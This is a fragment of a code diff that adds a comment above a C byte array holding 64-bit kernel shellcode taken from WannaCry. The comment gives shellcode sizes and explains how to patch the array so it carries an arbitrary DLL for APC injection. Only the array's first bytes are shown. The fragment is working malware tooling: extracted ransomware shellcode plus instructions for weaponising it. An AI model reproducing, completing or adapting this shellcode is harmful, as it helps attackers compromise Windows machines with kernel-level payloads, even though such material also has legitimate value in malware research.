@@ -1,3 +1,23 @@
+/*
+Total Shellcode Size = 6144
+Userland Shellcode Size = 3978
+Kernel Shellcode Size: 2166
+
+To Edit DLL Size and Ordinal in Shellcode...it should be:
+sixtyforbit_kernel_shellcode_from_wannacry[2166+0xF82] = 0x50D800;
+sixtyforbit_kernel_shellcode_from_wannacry[2166+0xF86] = 1;
+
+Wannacry also edits a value in the kernel shellcode:
+dword_4302CE    dd 1DF8Ah
+or 0x8A, 0xDF, 0x01
+the value = 0x50D800 + 3978.  Presumably because the kernel shellcode
+needs to allocate memory of the size of the DLL + the userland shellcode
+in the process where the APC injection happens.
+
+Will come back to find where in the shellcode the offset is for values
+0x8A, 0xDF, 0x01 / \x8A\xDF\x01
+*/
+
 unsigned char sixtyforbit_kernel_shellcode_from_wannacry[] =
 {
   0x48, 0x89, 0xE0, 0x66, 0x83, 0xE4, 0xF0, 0x41, 0x57, 0x41, 
